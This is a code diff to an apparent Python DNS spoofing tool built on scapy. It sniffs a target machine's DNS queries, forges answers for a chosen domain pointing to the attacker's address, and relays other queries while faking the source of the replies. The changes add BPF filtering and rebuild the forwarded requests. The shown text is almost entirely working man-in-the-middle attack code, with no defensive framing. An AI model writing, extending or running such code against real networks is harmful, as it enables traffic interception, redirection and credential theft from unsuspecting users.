@@ -13,13 +13,13 @@ class DNSSpoofer:
         Just call the stop() method. Calling this before start() does nothing.
     """
 
-    def __init__(self, target_ip: str, target_domain: str, interface: str = conf.iface, new_dns_ip: str = '', new_dns_ip6: str = '') -> None:
+    def __init__(self, target_ip: str, target_domain: str, bpf_filtering: bool = True, interface: str = conf.iface, new_dns_ip: str = '', new_dns_ip6: str = '') -> None:
         self.target_ip = target_ip
         self.interface = interface
         self.target_domain = target_domain
         self.new_dns_ip = new_dns_ip if new_dns_ip else get_if_addr(interface)
         self.new_dns_ip6 = new_dns_ip6 if new_dns_ip6 else get_if_addr6(interface)
-
+        self.bpf_filtering = bpf_filtering
 
     def is_supported_type(self, id: int) -> bool:
         return (
@@ -120,22 +120,19 @@ class DNSSpoofer:
             # Is from targeted machine, and is a request for targeted domain
             print(f'Spoof DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
             self.spoof_dns_request(pkt)
-        elif pkt[DNS].ancount == 0 and pkt[DNS].opcode == 0 and self.is_from_target(pkt):
+        elif pkt[DNS].qr == 0 and pkt[DNS].opcode == 0 and self.is_from_target(pkt):
             # Any other DNS request, get the real response from Google first
             print(f'Forward DNS request for: {str(pkt[DNSQR].qname)}, to {pkt[IP].dst}, from {pkt[IP].src}')
             spoofed_req: Packet = (
                 IP(dst=pkt[IP].dst) /
                 UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) /
-                DNS()
+                DNS(id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname, qtype=pkt[DNSQR].qtype), rd=1)
             )
-
-            spoofed_req[DNS].id = pkt[DNS].id
-            spoofed_req[DNS].qd = DNSQR(qname=pkt[DNSQR].qname)
-            spoofed_req[DNS].rd = 1
 
             real_res: Packet = sr1(spoofed_req, inter=1, retry=3, timeout=1, verbose=True)
 
             if real_res and DNS in real_res:
+                # Got the real response from DNS server
                 print(f'Got back response for {str(pkt[DNSQR].qname)}')
                 spoofed_res: Packet = (
                     IP(dst=pkt[IP].src, src=real_res[IP].src) /
@@ -144,7 +141,8 @@ class DNSSpoofer:
                 )
 
                 spoofed_res[DNS] = real_res[DNS]
-
+                
+                # Send spoofed response with legitimate data
                 send(spoofed_res, iface=self.interface, verbose=False)
             else:
                 print(f'No response for {str(pkt[DNSQR].qname)}')
@@ -158,8 +156,14 @@ class DNSSpoofer:
             print("Cannot turn on IP forwarding automatically...")
     
     def start(self) -> None:
-        """Start an asynchronous sniffer, use the stop() method to stop this"""
-        self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, lfilter=self.is_dns, store=False)
+        """
+            Start an asynchronous sniffer, use the stop() method to stop this
+            BPF filtering has better performance, but does not work with all interfaces, like virtualbox interfaces
+        """
+        if self.bpf_filtering:
+            self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, filter='udp and port 53', store=False)
+        else:
+            self.sniffer = AsyncSniffer(iface=self.interface, prn=self.handle_dns_packet, lfilter=self.is_dns, store=False)
         self.sniffer.start()
         self.set_packet_forwarding(True)
         print("DNS spoofing started")
